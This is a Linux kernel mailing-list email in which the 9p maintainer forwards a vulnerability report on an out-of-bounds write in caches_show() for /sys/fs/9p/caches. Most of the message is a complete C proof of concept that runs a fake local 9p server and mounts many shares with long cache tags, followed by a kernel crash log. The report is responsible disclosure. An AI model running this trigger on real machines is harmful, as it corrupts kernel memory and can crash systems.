Received: from submarine.notk.org (submarine.notk.org [62.210.214.84])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 08E4E184540
	for <v9fs@lists.linux.dev>; Sat, 20 Jun 2026 22:16:43 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=62.210.214.84
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1781993806; cv=none; b=LgyrZeWrU4afIGsXwhEV53J2kXIF5f7E1XygaTaGTM+8iKiir60wXdyBo1RjmuuFxx/0c0vUJo8JrZ3R7V3y0QEhes6Y+Y0buJ8BUfo+EDSGo6/M8pjbTNnDBbCn42s43NMukjM9rbFEptk+pJnjBW9LfgMsJvqBDJiGTzfj94U=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1781993806; c=relaxed/simple;
	bh=mSEGDUEcS0dWzqABMf231NiwMs/FxnCFPo3p2QEAnfk=;
	h=Date:From:To:Cc:Subject:Message-ID:References:MIME-Version:
	 Content-Type:Content-Disposition:In-Reply-To; b=XFS1a9cp/FPRBWFttriSQLcfWU+NNb93a0QyI3ueyug7Di1D+rzVaJMBjk++N0rnXHvLeRLrL2R6gHPG+/XL6ej2U/ala0trhMSbmN6chEEakHrPyOU1IbrJZeX6WCz6tTxuIMlHPmILEp9OmJaJl/4ot5oLDxCtpy3eeBYGLTk=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=codewreck.org; spf=pass smtp.mailfrom=codewreck.org; dkim=pass (2048-bit key) header.d=codewreck.org header.i=@codewreck.org header.b=Tcfln3hV; arc=none smtp.client-ip=62.210.214.84
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=codewreck.org
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=codewreck.org
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=codewreck.org header.i=@codewreck.org header.b="Tcfln3hV"
Received: from gaia.codewreck.org (localhost [127.0.0.1])
	by submarine.notk.org (Postfix) with ESMTPS id C18A814C2D6;
	Sun, 21 Jun 2026 00:16:32 +0200 (CEST)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=codewreck.org;
	s=2; t=1781993795;
	h=from:from:reply-to:subject:subject:date:date:message-id:message-id:
	 to:to:cc:cc:mime-version:mime-version:content-type:content-type:
	 in-reply-to:in-reply-to:references:references;
	bh=y6UCxFN606II7pzibQAgdA1vIfvAVnYaETUUavDQt6g=;
	b=Tcfln3hVcztuSzGHGw9TydvLYvxlnXWBLj++cUwHu0GRaUXOw87qXk2L1aJsK81fLoQ3t2
	HDDhPaUy18UvI5CQSUw/bt4waQMQ+HKe8Z00vcjRFAAkw1QD8oWncdmsEs5/420qH6CYAK
	sNHHgMtrQlX/pg+3ZxphIuYV1cMu3vhlQyqGMYL7i2FayhIpy/LMrOmWUiOoN8YM8tG3oG
	5stbPQLV4hDgCScif1kpdTjcadssiERTCqfpH2yX0iu2vKs7OdIxTQ2toXyaMsL+oVsmwu
	cW3nDIFs6fuSMYqLu4aq5KmpBjiExn85/VYWqK3g2zrTAa5e10W4XDeVYvVfiA==
Received: from localhost (gaia.codewreck.org [local])
	by gaia.codewreck.org (OpenSMTPD) with ESMTPA id c662808d;
	Sat, 20 Jun 2026 22:16:31 +0000 (UTC)
Date: Sun, 21 Jun 2026 07:16:16 +0900
From: Dominique Martinet <asmadeus@codewreck.org>
To: Ren Wei <n05ec@lzu.edu.cn>
Cc: ericvh@kernel.org, lucho@ionkov.net, linux_oss@crudebyte.com,
	rpembry@gmail.com, yuantan098@gmail.com, zcliangcn@gmail.com,
	bird@lzu.edu.cn, zzhan461@ucr.edu, v9fs@lists.linux.dev
Subject: Re: [PATCH 0/1] 9p: caches_show() out-of-bounds write
Message-ID: <ajcRMMkrOyaKyv0n@codewreck.org>
References: <cover.1781908090.git.zzhan461@ucr.edu>
Precedence: bulk
X-Mailing-List: v9fs@lists.linux.dev
List-Id: <v9fs.lists.linux.dev>
List-Subscribe: <mailto:v9fs+subscribe@lists.linux.dev>
List-Unsubscribe: <mailto:v9fs+unsubscribe@lists.linux.dev>
MIME-Version: 1.0
Content-Type: text/plain; charset=utf-8
Content-Disposition: inline
In-Reply-To: <cover.1781908090.git.zzhan461@ucr.edu>

Ren Wei wrote on Sat, Jun 20, 2026 at 11:53:02PM +0800:
> From: Zhao Zhang <zzhan461@ucr.edu>
> 
> Hi Linux kernel maintainers,

There's no reason not to send that to the list (it requires privileges
as you said), so quoting in full with v9fs@ in cc

(I see you also sent a patch, I don't consider this a priority so will
look at it more closely after the merge window; there's another similar
fix for the v9fs tag show being discussed right now)

> We found an issue in fs/9p/v9fs.c.
> The bug is reachable by a privileged user with permission to mount 9p filesystems.
> The relevant details are provided below.
> 
> ---- details below ----
> 
> Bug details:
> 
> The bug is in `caches_show()` for `/sys/fs/9p/caches`.
> 
> That function iterates the global 9p session list and appends each
> session's `cachetag` into the sysfs buffer with:
> 
> `snprintf(buf + count, limit, "%s\n", v9ses->cachetag)`
> 
> It then advances:
> 
> `count += n;`
> `limit -= n;`
> 
> This is incorrect because `snprintf()` returns the full would-have-been
> length, not the number of bytes actually stored. Once the accumulated
> cache-tag output exceeds `PAGE_SIZE`, `count` advances past the end of
> the sysfs buffer and `limit` becomes negative.
> 
> A later iteration then passes an out-of-bounds destination pointer and a
> large `size_t` converted from the negative `limit` into `snprintf()`,
> leading to an out-of-bounds write in the sysfs show path.
> 
> In practice this is reachable when `CONFIG_9P_FSCACHE` is enabled and a
> privileged user mounts enough 9p instances with long `cachetag=` values
> before reading `/sys/fs/9p/caches`.
> 
> Reproducer:
> 
> cc -x c -O2 -static -o mini_poc.bin mini_poc
> ./mini_poc.bin
> 
> 
> We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.
> 
> ------BEGIN PoC------
> 
> #define _GNU_SOURCE
> 
> #include <arpa/inet.h>
> #include <errno.h>
> #include <fcntl.h>
> #include <signal.h>
> #include <stdint.h>
> #include <stdio.h>
> #include <stdlib.h>
> #include <string.h>
> #include <sys/mount.h>
> #include <sys/socket.h>
> #include <sys/stat.h>
> #include <sys/types.h>
> #include <sys/wait.h>
> #include <time.h>
> #include <unistd.h>
> 
> #define PORT 5640
> #define MOUNTS 19
> #define TAG_FILL 211
> 
> enum {
> 	P9_RLERROR = 7,
> 	P9_TGETATTR = 24,
> 	P9_RGETATTR = 25,
> 	P9_TVERSION = 100,
> 	P9_RVERSION = 101,
> 	P9_TATTACH = 104,
> 	P9_RATTACH = 105,
> 	P9_TFLUSH = 108,
> 	P9_RFLUSH = 109,
> 	P9_TCLUNK = 120,
> 	P9_RCLUNK = 121,
> };
> 
> static const char version_str[] = "9P2000.L";
> static const uint64_t p9_stats_mask = 0x7ffULL | 0x1000ULL;
> 
> static void put_le16(unsigned char *p, uint16_t v)
> {
> 	p[0] = v & 0xff;
> 	p[1] = (v >> 8) & 0xff;
> }
> 
> static void put_le32(unsigned char *p, uint32_t v)
> {
> 	p[0] = v & 0xff;
> 	p[1] = (v >> 8) & 0xff;
> 	p[2] = (v >> 16) & 0xff;
> 	p[3] = (v >> 24) & 0xff;
> }
> 
> static void put_le64(unsigned char *p, uint64_t v)
> {
> 	put_le32(p, (uint32_t)v);
> 	put_le32(p + 4, (uint32_t)(v >> 32));
> }
> 
> static uint16_t get_le16(const unsigned char *p)
> {
> 	return (uint16_t)p[0] | ((uint16_t)p[1] << 8);
> }
> 
> static uint32_t get_le32(const unsigned char *p)
> {
> 	return (uint32_t)p[0] |
> 	       ((uint32_t)p[1] << 8) |
> 	       ((uint32_t)p[2] << 16) |
> 	       ((uint32_t)p[3] << 24);
> }
> 
> static ssize_t read_full(int fd, void *buf, size_t len)
> {
> 	size_t off = 0;
> 
> 	while (off < len) {
> 		ssize_t ret = read(fd, (char *)buf + off, len - off);
> 
> 		if (ret == 0)
> 			return off;
> 		if (ret < 0) {
> 			if (errno == EINTR)
> 				continue;
> 			return -1;
> 		}
> 		off += ret;
> 	}
> 
> 	return off;
> }
> 
> static int write_full(int fd, const void *buf, size_t len)
> {
> 	size_t off = 0;
> 
> 	while (off < len) {
> 		ssize_t ret = write(fd, (const char *)buf + off, len - off);
> 
> 		if (ret < 0) {
> 			if (errno == EINTR)
> 				continue;
> 			return -1;
> 		}
> 		off += ret;
> 	}
> 
> 	return 0;
> }
> 
> static int send_reply(int fd, uint8_t type, uint16_t tag,
> 		      const void *payload, uint32_t payload_len)
> {
> 	unsigned char hdr[7];
> 
> 	put_le32(hdr, 7 + payload_len);
> 	hdr[4] = type;
> 	put_le16(hdr + 5, tag);
> 	if (write_full(fd, hdr, sizeof(hdr)) < 0)
> 		return -1;
> 	if (payload_len && write_full(fd, payload, payload_len) < 0)
> 		return -1;
> 	return 0;
> }
> 
> static int send_lerror(int fd, uint16_t tag, uint32_t err)
> {
> 	unsigned char payload[4];
> 
> 	put_le32(payload, err);
> 	return send_reply(fd, P9_RLERROR, tag, payload, sizeof(payload));
> }
> 
> static int handle_client(int fd)
> {
> 	static const unsigned char root_qid[13] = {
> 		0x80, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00,
> 		0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
> 	};
> 
> 	for (;;) {
> 		unsigned char hdr[7];
> 		unsigned char payload[8192];
> 		uint32_t size;
> 		uint8_t type;
> 		uint16_t tag;
> 
> 		if (read_full(fd, hdr, sizeof(hdr)) != sizeof(hdr))
> 			return 0;
> 
> 		size = get_le32(hdr);
> 		type = hdr[4];
> 		tag = get_le16(hdr + 5);
> 		if (size < sizeof(hdr) || size - sizeof(hdr) > sizeof(payload))
> 			return -1;
> 		if (read_full(fd, payload, size - sizeof(hdr)) !=
> 		    (ssize_t)(size - sizeof(hdr)))
> 			return -1;
> 
> 		switch (type) {
> 		case P9_TVERSION: {
> 			unsigned char out[4 + 2 + sizeof(version_str) - 1];
> 			uint32_t msize = 8192;
> 
> 			if (size >= 11)
> 				msize = get_le32(payload);
> 			put_le32(out, msize);
> 			put_le16(out + 4, sizeof(version_str) - 1);
> 			memcpy(out + 6, version_str, sizeof(version_str) - 1);
> 			if (send_reply(fd, P9_RVERSION, tag, out, sizeof(out)) < 0)
> 				return -1;
> 			break;
> 		}
> 		case P9_TATTACH:
> 			if (send_reply(fd, P9_RATTACH, tag,
> 				       root_qid, sizeof(root_qid)) < 0)
> 				return -1;
> 			break;
> 		case P9_TGETATTR: {
> 			unsigned char out[153];
> 			uint64_t now = (uint64_t)time(NULL);
> 			uint64_t vals[] = {
> 				2, 0, 0, 4096, 0,
> 				now, 0, now, 0, now, 0, now, 0, 1, 1,
> 			};
> 			size_t off = 0;
> 			size_t i;
> 
> 			memset(out, 0, sizeof(out));
> 			put_le64(out + off, p9_stats_mask);
> 			off += 8;
> 			memcpy(out + off, root_qid, sizeof(root_qid));
> 			off += sizeof(root_qid);
> 			put_le32(out + off, 040755);
> 			off += 4;
> 			put_le32(out + off, 0);
> 			off += 4;
> 			put_le32(out + off, 0);
> 			off += 4;
> 			for (i = 0; i < sizeof(vals) / sizeof(vals[0]); i++) {
> 				put_le64(out + off, vals[i]);
> 				off += 8;
> 			}
> 			if (send_reply(fd, P9_RGETATTR, tag, out, sizeof(out)) < 0)
> 				return -1;
> 			break;
> 		}
> 		case P9_TCLUNK:
> 			send_reply(fd, P9_RCLUNK, tag, NULL, 0);
> 			return 0;
> 		case P9_TFLUSH:
> 			if (send_reply(fd, P9_RFLUSH, tag, NULL, 0) < 0)
> 				return -1;
> 			break;
> 		default:
> 			if (send_lerror(fd, tag, 95) < 0)
> 				return -1;
> 			break;
> 		}
> 	}
> }
> 
> static void server_loop(void)
> {
> 	struct sockaddr_in addr;
> 	int one = 1;
> 	int listen_fd;
> 
> 	listen_fd = socket(AF_INET, SOCK_STREAM, 0);
> 	if (listen_fd < 0)
> 		_exit(1);
> 	setsockopt(listen_fd, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));
> 
> 	memset(&addr, 0, sizeof(addr));
> 	addr.sin_family = AF_INET;
> 	addr.sin_port = htons(PORT);
> 	addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
> 	if (bind(listen_fd, (struct sockaddr *)&addr, sizeof(addr)) < 0)
> 		_exit(1);
> 	if (listen(listen_fd, 16) < 0)
> 		_exit(1);
> 
> 	for (;;) {
> 		int client_fd = accept(listen_fd, NULL, NULL);
> 
> 		if (client_fd < 0) {
> 			if (errno == EINTR)
> 				continue;
> 			_exit(1);
> 		}
> 		handle_client(client_fd);
> 		close(client_fd);
> 	}
> }
> 
> static int write_text(const char *path, const char *text)
> {
> 	int fd = open(path, O_WRONLY);
> 	size_t len = strlen(text);
> 
> 	if (fd < 0)
> 		return -1;
> 	if (write_full(fd, text, len) < 0) {
> 		close(fd);
> 		return -1;
> 	}
> 	close(fd);
> 	return 0;
> }
> 
> static void cleanup_mounts(const char *base)
> {
> 	char mp[128];
> 	int i;
> 
> 	for (i = 1; i <= MOUNTS; i++) {
> 		snprintf(mp, sizeof(mp), "%s/mnt.%d", base, i);
> 		umount2(mp, MNT_DETACH);
> 	}
> }
> 
> static int mount_sessions(const char *base)
> {
> 	char mp[128];
> 	char tag[4 + TAG_FILL + 1];
> 	char opts[512];
> 	int i;
> 
> 	for (i = 1; i <= MOUNTS; i++) {
> 		snprintf(mp, sizeof(mp), "%s/mnt.%d", base, i);
> 		mkdir(mp, 0755);
> 		snprintf(tag, sizeof(tag), "%03d_", i);
> 		memset(tag + 4, 'A', TAG_FILL);
> 		tag[sizeof(tag) - 1] = '\0';
> 		snprintf(opts, sizeof(opts),
> 			 "trans=tcp,port=%d,version=9p2000.L,cache=fscache,cachetag=%s",
> 			 PORT, tag);
> 		if (mount("127.0.0.1", mp, "9p", 0, opts) < 0) {
> 			perror("mount");
> 			return -1;
> 		}
> 	}
> 
> 	return 0;
> }
> 
> static int dump_caches(void)
> {
> 	char buf[4096];
> 	int fd;
> 
> 	fd = open("/sys/fs/9p/caches", O_RDONLY);
> 	if (fd < 0) {
> 		perror("open");
> 		return -1;
> 	}
> 
> 	for (;;) {
> 		ssize_t ret = read(fd, buf, sizeof(buf));
> 
> 		if (ret == 0)
> 			break;
> 		if (ret < 0) {
> 			perror("read");
> 			close(fd);
> 			return -1;
> 		}
> 		if (write_full(STDOUT_FILENO, buf, ret) < 0) {
> 			close(fd);
> 			return -1;
> 		}
> 	}
> 
> 	close(fd);
> 	return 0;
> }
> 
> int main(void)
> {
> 	const char *base = "/tmp/v9fs-caches-poc";
> 	pid_t child;
> 	int status = 1;
> 
> 	if (geteuid() != 0) {
> 		fprintf(stderr, "run as root\n");
> 		return 1;
> 	}
> 
> 	mkdir(base, 0755);
> 	cleanup_mounts(base);
> 	write_text("/proc/sys/kernel/panic_on_warn", "0\n");
> 	write_text("/proc/sys/kernel/panic_on_oops", "0\n");
> 
> 	child = fork();
> 	if (child < 0) {
> 		perror("fork");
> 		return 1;
> 	}
> 	if (child == 0)
> 		server_loop();
> 
> 	sleep(1);
> 	if (mount_sessions(base) == 0 && dump_caches() == 0)
> 		status = 0;
> 
> 	cleanup_mounts(base);
> 	kill(child, SIGTERM);
> 	waitpid(child, NULL, 0);
> 	return status;
> }
> 
> 
> ------END PoC--------
> 
> ----BEGIN crash log----
> 
> [  312.177878][T10660] Kernel panic - not syncing: kernel: panic_on_warn set ...
> [  312.178459][T10660] CPU: 0 UID: 0 PID: 10660 Comm: cat Not tainted 7.0.0-08308-g9e1e9d660255 #1 PREEMPT(full)
> [  312.181692][T10660]  check_panic_on_warn+0x61/0x80
> [  312.182076][T10660]  __warn+0xe8/0x330
> [  312.189425][T10660] RIP: 0010:vsnprintf+0xbfb/0x1180
> [  312.192016][T10660] RDX: 1ff400000138ef52 RSI: ffffffffffffff4d RDI: ff1100006f9850b3
> [  312.195689][T10660]  snprintf+0xaa/0xe0
> [  312.197121][T10660]  caches_show+0x79/0xe0
> [  312.197845][T10660]  sysfs_kf_seq_show+0x1bd/0x380
> [  312.198611][T10660]  seq_read_iter+0x40f/0x11f0
> [  312.200066][T10660]  vfs_read+0x6cd/0xb70
> [  312.203264][T10660]  ksys_read+0xf9/0x1d0
> [  312.204639][T10660]  do_syscall_64+0x116/0xf80
> [  312.205311][T10660]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
> 
> 
> -----END crash log-----
> 
> Best regards,
> Zhao Zhang
> 
> 
> Zhao Zhang (1):
>   9p: v9fs: fix caches_show() out-of-bounds write
> 
>  fs/9p/v9fs.c | 16 +++++-----------
>  1 file changed, 5 insertions(+), 11 deletions(-)
> 

-- 
Dominique Martinet | Asmadeus
